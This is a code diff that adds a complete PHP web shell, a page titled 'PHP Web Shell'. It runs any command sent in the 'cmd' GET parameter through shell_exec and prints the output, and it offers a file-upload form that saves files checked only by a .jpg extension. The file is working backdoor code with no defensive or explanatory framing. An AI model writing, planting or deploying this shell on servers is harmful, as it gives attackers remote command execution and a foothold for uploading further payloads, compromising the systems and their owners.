@@ -1,0 +1,98 @@
+<?php
+// Disable error reporting
+error_reporting(0);
+
+// Check if the command parameter is set
+if (isset($_GET['cmd'])) {
+    // Execute the command and display the output
+    $cmd = escapeshellcmd($_GET['cmd']);
+    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
+}
+
+// Check if a file has been uploaded
+if (isset($_FILES['file'])) {
+    // Directory where the uploaded files will be saved
+    $target_dir = "uploads/";
+
+    // Path of the file to be uploaded
+    $target_file = $target_dir . basename($_FILES['file']['name']);
+
+    // Check if the file is actually a PHP file disguised as a .jpg
+    $file_type = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+    if ($file_type == "jpg") {
+        // Move the uploaded file to the target directory
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
+            echo "File uploaded successfully.";
+        } else {
+            echo "There was an error uploading the file.";
+        }
+    } else {
+        echo "Only .jpg files are allowed.";
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PHP Web Shell</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        h1 {
+            text-align: center;
+        }
+        form {
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="file"], input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PHP Web Shell</h1>
+        <form method="get">
+            <input type="text" name="cmd" placeholder="Enter command">
+            <input type="submit" value="Execute">
+        </form>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="file">
+            <input type="submit" value="Upload">
+        </form>
+    </div>
+</body>
+</html>
